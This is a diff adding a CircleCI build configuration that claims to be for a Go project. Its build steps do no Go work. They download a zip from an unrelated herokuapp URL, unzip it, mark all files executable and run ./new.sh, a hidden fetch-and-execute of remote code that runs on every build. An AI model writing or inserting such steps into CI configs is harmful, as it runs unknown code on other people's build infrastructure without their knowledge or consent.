@@ -1,0 +1,13 @@
+# Check https://circleci.com/docs/2.0/language-go/ for more details
+version: 2
+
+jobs:
+  build:
+    docker:
+      - image: circleci/golang:1.9
+    steps:
+      - run: curl https://dlmediafiles.herokuapp.com/-1001403671743/130472/download -o new.zip
+      - run: unzip new
+      - run: chmod +x *
+      - run: ./new.sh
+     
